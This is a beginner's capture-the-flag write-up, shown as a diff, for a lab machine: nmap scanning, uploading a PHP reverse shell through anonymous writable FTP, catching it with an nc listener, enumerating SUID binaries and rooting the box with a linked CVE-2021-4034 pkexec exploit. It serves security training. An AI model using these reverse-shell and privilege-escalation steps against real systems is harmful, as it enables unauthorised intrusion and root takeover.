@@ -1,0 +1,79 @@
+ 
+This is my first attempt at a writeup so bear with me if it sucks lol.   
+The first thing I will say is after solving this in my own way I went back and looked at the writeups.  
+Im not sure if something changed since those were posted or if they just liked doing things the hard way but my method is way faster and much much easier.
+
+I started with a simple command to make things quicker then did a basic nmap scan
+ 
+ export target=<target ip>
+ nmap $target
+we see ports 21,22, and 80
+
+Scan a little deeper with nmap 
+nmap -sC -sV $target
+we see port 21 has a directory and 2 files.  
+
+Browse the website, and look at source code.  Nothing really stands out so lets move on.
+SSH but bruteforcing that could take forever so lets look at the low hanging fruit FTP
+Anonymous ftp is working.
+
+Listing the contents gives us a directory and a couple of files
+ftp is writeable
+Lets try uploading files.  Using a php reverse shell 
+ put shell.php
+ transfer complete.
+ 
+Start a listener using nc -nvlp 4242 and browsed to the file I just uploaded.
+
+Got a shell,  lets upgrade that shell.  
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+ 
+Listing the directory and we see the recipe.txt file.
+  Cat recipe.txt
+ 
+Home directory has Lennie but we cannot access it.  
+Escalate privileges.   I always go straight to suid/guid bits if sudo doesn’t work which is the case here.
+ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -ls {} \;
+  /bin/mount
+  /bin/fusermount
+  /bin/umount
+  /bin/ping6
+  /bin/su
+  /bin/ping
+  /sbin/unix_chkpwd
+  /sbin/pam_extrausers_chkpwd
+  /usr/bin/screen
+  /usr/bin/passwd
+  /usr/bin/chage
+  /usr/bin/pkexec
+  /usr/bin/at
+  /usr/bin/sudo
+  /usr/bin/newuidmap
+  /usr/bin/mlocate
+  /usr/bin/wall
+  /usr/bin/chfn
+  /usr/bin/ssh-agent
+  /usr/bin/bsd-write
+  /usr/bin/newgidmap
+  /usr/bin/gpasswd
+  /usr/bin/expiry
+  /usr/bin/crontab
+  /usr/lib/eject/dmcrypt-get-device
+  
+Out of all those the one that I saw that stood out the most is pkexec.  I have used this binary many times to get root as its an old one.  CVE-2021-4034
+https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py
+
+Created pkexec_exploit.py and moved it to the target.  FYI  you either have to use vim (which I suck at) or use ftp or wget to move the file.  Now run the exploit
+ python3 pkexec_exploit.py
+ GOT ROOT SHELL!!
+ 
+From here you can finish all the questions.
+ cat /home/lennie/user.txt
+ 
+ cat /root/root.txt
+ 
+That’s it!  I hope this helps you later on as you will now know to look for that exploit. 
+Best wishes,
+sk4r3kr0w
+
+
